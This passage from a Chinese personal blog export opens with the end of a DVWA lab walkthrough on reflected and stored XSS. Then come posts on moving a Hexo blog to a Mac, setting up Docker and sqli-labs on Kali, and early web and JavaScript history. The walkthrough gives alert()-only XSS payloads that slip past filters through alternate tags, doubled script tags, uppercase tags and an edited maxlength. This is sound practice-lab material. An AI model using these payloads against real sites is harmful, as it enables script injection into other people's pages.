alt="image-20210702173429626"></p><h2 id="2-medium-7"><a href="#2-medium-7" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702174437664.png" alt="image-20210702174437664"></p><p>使用str_replace限制了<code>&lt;script&gt;</code>标签。</p><p>可以用<strong>其他标签</strong>进行代替。</p><p>例如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=alert(1)&gt;<br>&lt;img <span class="hljs-attribute">src</span>=0 <span class="hljs-attribute">onerror</span>=alert(&quot;xss&quot;)&gt;  <br></code></pre></td></tr></table></figure><p>由于str_replace只进行一次转换，所以也可以使用<strong>双写绕过</strong>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;sc<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ript&gt;alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702175353915.png" alt="image-20210702175353915"></p><h2 id="3-high-7"><a href="#3-high-7" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702175557494.png" alt="image-20210702175557494"></p><p>script标签的被过滤了。</p><p>使用<strong>其他标签</strong>即可绕过。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702175758750.png" alt="image-20210702175758750"></p><h2 id="4-impossible-7"><a href="#4-impossible-7" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702180030280.png" alt="image-20210702180030280"></p><p>htmlspecialchars — 将预定义的字符（**&amp;<strong>、</strong>“<strong>、</strong>‘<strong>、</strong>&lt;**、**&gt;**） 转换为 HTML 实体。</p><p>也就意味着一些特殊的标签将无法生效。</p><p>xss漏洞无法利用，但查询后发现也有绕过的可能性，例如htmlspecialchars未能奏效的场景（详见<a href="htmlspecialchars">知乎</a>）。但该方法对此场景未能生效。</p><h1 id="十、xss（stored）存储型"><a href="#十、xss（stored）存储型" class="headerlink" title="十、xss（stored）存储型"></a>十、xss（stored）存储型</h1><h2 id="1-low-8"><a href="#1-low-8" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706102921672.png" alt="image-20210706102921672"></p><p>trim(string,charlist) ： 移除string字符两侧的预定义字符，预定义字符包括\t 、 \n 、\x0B 、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</p><p>stripslashes（）删除反斜杠。</p><p>mysql_real_escape_string() 对特殊字符进行转义。</p><p>实际上对输入的内容并没有进行xss过滤。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/111/</span>)</span></span><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>;</span></span></span><br></code></pre></td></tr></table></figure><p>每一次提交都会弹出窗口。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706104324274.png" alt="image-20210706104324274"></p><h2 id="2-medium-8"><a href="#2-medium-8" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706105010065.png" alt="image-20210706105010065"></p><p>addslashes() 函数返回在预定义字符（**&amp;<strong>、</strong>“<strong>、</strong>‘<strong>、</strong>&lt;**、**&gt;**） 之前添加反斜杠的字符串。</p><p>strip_tag()删除字符串中的html标签。</p><p>htmlspecialchars — 将预定义的字符转换为 HTML 实体。</p><p>上传<code>alert(&#39;1&#39;)</code>,发现单引号被反斜杠过滤。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706105931652.png" alt="image-20210706105931652"></p><p>message过滤掉了所有的标签，但name只替换了script，而且过滤的是小写。</p><p>尝试从name进行xss攻击（大小写），但name限制只能输入10个字符。</p><p>f12打开查看器，修改<strong>maxlength</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111059697.png" alt="image-20210706111059697"></p><p>构造语句：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><br></code></pre></td></tr></table></figure><p>攻击成功：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111159270.png" alt="image-20210706111159270"></p><h2 id="3-high-8"><a href="#3-high-8" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111247688.png" alt="image-20210706111247688"></p><p>name的script完全被过滤。</p><p>使用其他标签进行攻击：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=alert(1)&gt;<br></code></pre></td></tr></table></figure><p>其他的操作和medium基本一致。</p><p>成功：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111555026.png" alt="image-20210706111555026"></p><h2 id="4-impossible-8"><a href="#4-impossible-8" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111658731.png" alt="image-20210706111658731"></p><p>需要获取和验证token，并添加了pdo机制。</p><p>name也同样使用htmlspecialchars进行了过滤。</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p>大佬很多，好文章很多，继续学习！</p><p>使用docker搭建dvwa环境：<a href="https://zhuanlan.zhihu.com/p/126668420">https://zhuanlan.zhihu.com/p/126668420</a></p><p>php函数参考：<a href="https://www.w3school.com.cn/php/">https://www.w3school.com.cn/php/</a></p><p>什么是token：<a href="https://www.jianshu.com/p/24825a2683e6">https://www.jianshu.com/p/24825a2683e6</a></p><p>burpsuit中attack的四种模式的区别：<a href="https://blog.csdn.net/u012804180/article/details/52015224">https://blog.csdn.net/u012804180/article/details/52015224</a></p><p>Web安全-命令执行漏洞：<a href="https://segmentfault.com/a/1190000016056455">https://segmentfault.com/a/1190000016056455</a></p><p>dvwa-csrf：<a href="https://www.jianshu.com/p/e65ede7d7026">https://www.jianshu.com/p/e65ede7d7026</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/82918141?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162495828916780265419802%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162495828916780265419802&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-82918141.pc_search_result_before_js&utm_term=dvwa+csrf&spm=1018.2226.3001.4187">DVWA之CSRF(跨站请求伪造攻击)</a></p><p>dvwa 1.10 High等级的CSRF另类通关法：<a href="https://www.freebuf.com/articles/web/203301.html">https://www.freebuf.com/articles/web/203301.html</a></p><p>Web安全实战系列：文件包含漏洞：<a href="https://www.freebuf.com/articles/web/182280.html">https://www.freebuf.com/articles/web/182280.html</a></p><p>php伪协议总结：<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p><p>一步一步学习dvwa渗透测试：<a href="https://zhuanlan.zhihu.com/p/105549209">https://zhuanlan.zhihu.com/p/105549209</a></p><p>sql预编译：<a href="https://www.cnblogs.com/micrari/p/7112781.html">https://www.cnblogs.com/micrari/p/7112781.html</a></p><p>dvwa之xss：<a href="https://blog.csdn.net/qq_36119192/article/details/82935895">https://blog.csdn.net/qq_36119192/article/details/82935895</a></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>dvwa</tag>
      
      <tag>docker</tag>
      
      <tag>mac</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo博客｜win10迁移到Mac</title>
    <link href="/2021/06/16/old/hexo%E5%8D%9A%E5%AE%A2%EF%BD%9Cwindows%E8%BF%81%E7%A7%BB%E5%88%B0mac/"/>
    <url>/2021/06/16/old/hexo%E5%8D%9A%E5%AE%A2%EF%BD%9Cwindows%E8%BF%81%E7%A7%BB%E5%88%B0mac/</url>
    
    <content type="html"><![CDATA[<p>最近换了新电脑，所以打算把博客也迁移一下。</p><h1 id="Win10转移到mac"><a href="#Win10转移到mac" class="headerlink" title="Win10转移到mac"></a>Win10转移到mac</h1><h2 id="1-安装brew"><a href="#1-安装brew" class="headerlink" title="1.安装brew"></a>1.安装brew</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>zsh -c <span class="hljs-string">&quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210615120303981.png" alt="image-20210615120303981"></p><p>安装完后重启终端。</p><span id="more"></span><p>查看是否安装完成。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">brew <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210615120740810.png" alt="image-20210615120740810"></p><h2 id="2-安装git和node-js"><a href="#2-安装git和node-js" class="headerlink" title="2.安装git和node.js"></a>2.安装git和node.js</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">brew </span><span class="hljs-keyword">install </span>git<br><span class="hljs-keyword">brew </span><span class="hljs-keyword">install </span>node<br></code></pre></td></tr></table></figure><h2 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3.安装hexo"></a>3.安装hexo</h2><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> -g hexo<br></code></pre></td></tr></table></figure><h2 id="4-初始化hexo"><a href="#4-初始化hexo" class="headerlink" title="4.初始化hexo"></a>4.初始化hexo</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> blog <br><span class="hljs-built_in">cd</span> blog<br>hexo init<br></code></pre></td></tr></table></figure><p>访问localhost:4000查看是否成功初始化：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210615142024454.png" alt="image-20210615142024454"></p><h2 id="5-生成ssh密钥"><a href="#5-生成ssh密钥" class="headerlink" title="5.生成ssh密钥"></a>5.生成ssh密钥</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">ssh-keygen -t rsa -C <span class="hljs-string">&quot;youremail@example.com&quot;</span> <span class="hljs-comment">#注册邮箱</span><br></code></pre></td></tr></table></figure><p>运行后进入.ssh文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ～/.ssh<br></code></pre></td></tr></table></figure><p>查看id_rsa.pub文件，复制里面的所有内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> id_rsa.pub<br></code></pre></td></tr></table></figure><p>网页打开github设置：<strong>setting -》 ssh and gpg keys</strong>，添加新的ssh key，把刚才复制的内容粘贴进去。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210615144012871.png" alt="image-20210615144012871"></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210615144428044.png" alt="image-20210615144428044"></p><p>保存后，邮箱会收到一封验证邮件，记得通过验证。</p><h2 id="6-文件配置转移"><a href="#6-文件配置转移" class="headerlink" title="6.文件配置转移"></a>6.文件配置转移</h2><p>将win10里博客根目录下的：</p><p><strong>_config.yml,</strong></p><p><strong>scaffolds,</strong></p><p><strong>source,</strong></p><p><strong>themes</strong></p><p>复制并覆盖到mac博客根目录下。</p><hr><p><strong>🌟关于如何windows如何传输文件到mac</strong></p><p>同一网络下。</p><p>windows：文件夹属性 -&gt; 共享 -&gt; 共享（得到网路路径）</p><p>mac：访达 -&gt; 连接服务器 -&gt; 输入smb:&#x2F;&#x2F;网络路径</p><hr><h2 id="7-个人信息设置"><a href="#7-个人信息设置" class="headerlink" title="7.个人信息设置"></a>7.个人信息设置</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">git <span class="hljs-built_in">config</span> <span class="hljs-comment">--global user.name &quot;yourname”</span><br>git <span class="hljs-built_in">config</span> <span class="hljs-comment">--global user.email youremail@example.com</span><br></code></pre></td></tr></table></figure><p>使用hexo s、hexo g、hexo d测试，无报错即成功。</p><h1 id="hexo-picgo-腾讯cos图床"><a href="#hexo-picgo-腾讯cos图床" class="headerlink" title="hexo+picgo+腾讯cos图床"></a>hexo+picgo+腾讯cos图床</h1><p>之前每次图片都要手传，连接都是手替换。</p><p>后来发现居然有方便的做法。</p><p>picgo：<a href="https://molunerfinn.com/PicGo/">https://molunerfinn.com/PicGo/</a></p><h2 id="1-腾讯云"><a href="#1-腾讯云" class="headerlink" title="1.腾讯云"></a>1.腾讯云</h2><p>打开腾讯云页面。</p><p>点击头像，选择<strong>访问管理 -〉访问密钥 -〉api密钥管理</strong>。</p><p>选择新建密钥，会生成appid、secretid、secretkey。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210616024543125.png" alt="image-20210616024543125"></p><p>进入cos产品界面。</p><p>创建一个存储桶（如果原来有桶也可以不用创建），权限选择公有读私有写。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210616030400440.png" alt="image-20210616030400440"></p><p>域名信息便是访问的地址。</p><p>记录下基本信息的<strong>存储桶名称和所属地域</strong>（例如ap-shenzhen-fsi）。</p><h2 id="2-picgo"><a href="#2-picgo" class="headerlink" title="2.picgo"></a>2.picgo</h2><p>进入图床设置，选择cos版本为v5，填写相关信息。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210616024816756.png" alt="image-20210616024816756"></p><h2 id="3-typore"><a href="#3-typore" class="headerlink" title="3.typore"></a>3.typore</h2><p>打开<strong>格式 -〉图像 -〉全局图片设置</strong></p><p>设置插入图片时为上传图片，上传服务为picgo.app</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210616031411224.png" alt="image-20210616031411224"></p><p>完成！</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p>转移：<a href="https://blog.csdn.net/qq_39153421/article/details/89362432?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">https://blog.csdn.net/qq_39153421/article/details/89362432?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control</a></p><p>picgo+cos图床：<a href="https://blog.csdn.net/qq_41684621/article/details/114128635">https://blog.csdn.net/qq_41684621/article/details/114128635</a></p>]]></content>
    
    
    <categories>
      
      <category>博客相关</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>mac</tag>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali搭建docker</title>
    <link href="/2021/06/15/old/kali%E6%90%AD%E5%BB%BAdocker/"/>
    <url>/2021/06/15/old/kali%E6%90%AD%E5%BB%BAdocker/</url>
    
    <content type="html"><![CDATA[<h1 id="kali搭建docker"><a href="#kali搭建docker" class="headerlink" title="kali搭建docker"></a>kali搭建docker</h1><p>1.安装https协议,ca证书,dirmngr</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> update<br>sudo apt-<span class="hljs-built_in">get</span> install -y apt-transport-https ca-certificates<br>sudo apt-<span class="hljs-built_in">get</span> install dirmngr<br></code></pre></td></tr></table></figure><p>2.添加gpg密钥，添加更新源</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -fsSL https:<span class="hljs-regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="hljs-regexp">/docker-ce/</span>linux<span class="hljs-regexp">/debian/g</span>pg | sudo apt-key add -<br>echo <span class="hljs-string">&#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27;</span> | sudo tee <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list.d/</span>docker.list<br></code></pre></td></tr></table></figure><span id="more"></span><p>3.系统更新</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sudo apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span><br></code></pre></td></tr></table></figure><p>4.安装docker社区版</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> docker-ce<br></code></pre></td></tr></table></figure><p>5.启动docker服务器</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">service docker <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure><p>6.安装compose</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> docker-compose<br></code></pre></td></tr></table></figure><p>7.docker</p><p>![image-20210613102042719](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210613102042719.png)</p><h1 id="kali测试安装sqli-labs"><a href="#kali测试安装sqli-labs" class="headerlink" title="kali测试安装sqli-labs"></a>kali测试安装sqli-labs</h1><p>1.查找相关安装镜像</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker search sqli-labs</span><br></code></pre></td></tr></table></figure><p>![image-20210614194536706](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614194536706.png)</p><p>2.拉取镜像</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> pull xxx（xxx为搜索到的镜像名）<br></code></pre></td></tr></table></figure><p>![image-20210614234537359](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614234537359.png)</p><p>3.查看本地镜像</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker images</span><br></code></pre></td></tr></table></figure><p>![image-20210614234819046](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614234819046.png)</p><p>4.启动镜像</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">docker run -<span class="hljs-selector-tag">dt</span> <span class="hljs-attr">--name</span> xxx -<span class="hljs-selector-tag">p</span> <span class="hljs-number">300</span>:<span class="hljs-number">80</span> <span class="hljs-attr">--rm</span> xxx<br></code></pre></td></tr></table></figure><p>-d：后台运行容器，并返回容器id</p><p>-t：分配一个虚拟的终端</p><p>–name：为容器指定一个名字</p><p>-p：指定端口映射，格式（<strong>主机端口:容器端口</strong>）</p><p>–rm：容器退出时，自动删除容器</p><p>5.访问靶场</p><p>![image-20210615021409240](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210615021409240.png)</p><p>6.关闭容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> stop<span class="hljs-meta"> [id]</span><br></code></pre></td></tr></table></figure><h1 id="出现的问题及解决方案"><a href="#出现的问题及解决方案" class="headerlink" title="出现的问题及解决方案"></a>出现的问题及解决方案</h1><h2 id="1-拉取镜像时出现无法找到最新版本"><a href="#1-拉取镜像时出现无法找到最新版本" class="headerlink" title="1.拉取镜像时出现无法找到最新版本"></a>1.拉取镜像时出现无法找到最新版本</h2><p>![image-20210614195833693](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614195833693.png)</p><p>1.去docker hub查询相关镜像</p><p>网址：<a href="https://hub.docker.com/">https://hub.docker.com/</a></p><p>![image-20210614201008832](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614201008832.png)</p><p>2.选择镜像的最新版本下载</p><p>![image-20210614200510298](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614200510298.png)</p><p>![image-20210614200350913](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614200350913.png)</p><p>![image-20210614201324219](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614201324219.png)</p><h2 id="2-arm架构镜像不兼容"><a href="#2-arm架构镜像不兼容" class="headerlink" title="2.arm架构镜像不兼容"></a>2.arm架构镜像不兼容</h2><p><strong>WARNING: The requested image’s platform (linux&#x2F;amd64) does not match the detected host platform (linux&#x2F;arm64&#x2F;v8) and no specific platform was requested</strong></p><p>一开始搞了半天也不知道咋处理，百度了下也很少有人遇见这个问题。</p><p>试着翻译了下是amd64和arm64的问题。</p><p>看样子只有mac才会出这个问题，见鬼的m1芯片。</p><p>macbook可使用<strong>rosetta</strong>，但parallelsdesktop虚拟机里arm版本的kali暂时还无法解决这个问题。</p><p>【关于如何在MacBook安装kali，可以参考知乎的这个问题：<a href="https://www.zhihu.com/question/434007164%E3%80%91">https://www.zhihu.com/question/434007164】</a></p><p>如果使用mac，直接搭建docker比较方便，无需在虚拟机里搭建。</p><p>但还是想尝试找一下解决方案。</p><p>等找到的时候，再写一篇文章。</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p>kali搭建sqli-labs：<a href="https://blog.csdn.net/weixin_42420804/article/details/106192827">https://blog.csdn.net/weixin_42420804/article/details/106192827</a></p><p>解决docker无法拉取问题：<a href="https://www.pianshen.com/article/9349196111/">https://www.pianshen.com/article/9349196111/</a></p><p>docker入门到精通：<a href="http://www.tianfeiyu.com/?p=2394">http://www.tianfeiyu.com/?p=2394</a></p><p>docker命令大全：<a href="https://www.runoob.com/docker/docker-command-manual.html">https://www.runoob.com/docker/docker-command-manual.html</a></p>]]></content>
    
    
    <categories>
      
      <category>杂</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali</tag>
      
      <tag>旧文章</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>培训day1-7</title>
    <link href="/2020/12/05/old/%E5%9F%B9%E8%AE%ADday1-7/"/>
    <url>/2020/12/05/old/%E5%9F%B9%E8%AE%ADday1-7/</url>
    
    <content type="html"><![CDATA[<p>pte培训7天的笔记整合。</p><span id="more"></span><p><a href="/2020/10/25/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday1/index.html">Day1</a></p><p>phpMyAdmin、apache tomcat 8.5.19、DoraBox、pikachu</p><p><a href="/2020/10/26/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday2/index.html">Day2</a></p><p>doraBOX</p><p><a href="/2020/10/30/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday3/index.html">Day3</a></p><p>sqli-labs、BUUCTF…</p><p><a href="/2020/11/03/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday4/index.html">Day4</a></p><p>xss、文件上传</p><p><a href="/2020/11/15/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday5/index.html">Day5</a></p><p>真题</p><p><a href="/2020/11/17/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday6/index.html">Day6</a></p><p>练习题</p><p><a href="/2020/12/05/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday7/index.html">Day7</a></p><p>代码审计、文件包含</p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些web历史</title>
    <link href="/2020/03/19/old/%E4%B8%80%E4%BA%9B%E5%8E%86%E5%8F%B2/"/>
    <url>/2020/03/19/old/%E4%B8%80%E4%BA%9B%E5%8E%86%E5%8F%B2/</url>
    
    <content type="html"><![CDATA[<p>觉得历史还是挺有意思的，虽说不是什么技术，但也有帮助去理解一些东西吧。</p><h1 id="web发展史"><a href="#web发展史" class="headerlink" title="web发展史"></a>web发展史</h1><p>世界上出现最早的浏览器叫<strong>www</strong>（worldwideweb）。</p><p>但<strong>mosaic</strong>是第一个互联网上<strong>普遍使用</strong>并且能够<strong>显示图片</strong>的网页浏览器。</p><p>1993年4月，马克·安德森和其团队研究出了mosaic。后因和伊利诺伊大学的版权纠纷，而做出了比前者更强的浏览器Netscape navigator（网景浏览器，又称为导航者）。</p><p>2003年，网景解散并开放源码。Mozilla公司基于源码开发了<strong>Mozilla Firebird</strong>。</p><!--more--><p>到2004年，改名为火狐<strong>firefox</strong>。</p><p>而拿到mosaic版权的伊利诺伊大学，把技术转让给了spyclass Entertainment公司。</p><p>1996年，微软收购spyclass的技术（基于mosaic原型）并开发了<strong>internet explorer</strong>浏览器。</p><h1 id="js历史"><a href="#js历史" class="headerlink" title="js历史"></a>js历史</h1><p>1996年，网景的<strong>布兰登·艾克</strong>花费了23天创造js，Javascript最先作为Netscape navigator的一部分。它最初的设计目标是改善网页的用户体验（能够动态的改变控制网页逻辑）。</p><p>最早js被布兰登·艾克命名为Mocal，后改名livescript，后又因为和sun公司（Oak语言的开发者，后改名为java）合作而改名为JavaScript。</p><p>后来sun公司被Oracle收购，JavaScript版权归Oracle所有。</p><h1 id="浏览器的组成"><a href="#浏览器的组成" class="headerlink" title="浏览器的组成"></a>浏览器的组成</h1><p>浏览器分为两大部分：<strong>shell</strong>（外核）和<strong>内核</strong></p><p>外核是浏览器上用户能操作的部分。</p><p>内核是用户看不到的，能够处理代码并显示代码。</p><p><strong>内核主要分为</strong>：</p><ol><li>渲染引擎（语法规则和渲染）：html、css基础语法的识别及绘制页面【ps：浏览器的页面绘制是一层一层的】</li><li>js引擎（负责JavaScript）</li><li>其他模块</li></ol><h1 id="JS引擎"><a href="#JS引擎" class="headerlink" title="JS引擎"></a>JS引擎</h1><p>1996年JavaScript诞生之初还没有引擎，还依赖于渲染引擎。</p><p>但由于当时技术不高，超过20行JavaScript代码，页面就无法运行了。</p><p>直到2001年发布的ie6，从内核中剥离了一个js引擎专门处理JavaScript代码，它可以处理万行以上的JavaScript代码。</p><p>2008年google联合apple开发了浏览器chrome。chrome使用的内核为Webkit，webkit使用的引擎为V8，能把js代码直接转化为机械码来执行，进而以速度快而闻名（直到现在Chrome的渲染速度依然很快）。</p><p>后来Firefox也推出了强大的js引擎，Firefox3.5的tracemonkey（对频繁执行的代码做了路径优化），Firefox4.0的legalmonkey。</p><h1 id="JavaScript的特色"><a href="#JavaScript的特色" class="headerlink" title="JavaScript的特色"></a>JavaScript的特色</h1><h3 id="1-它是解释性语言"><a 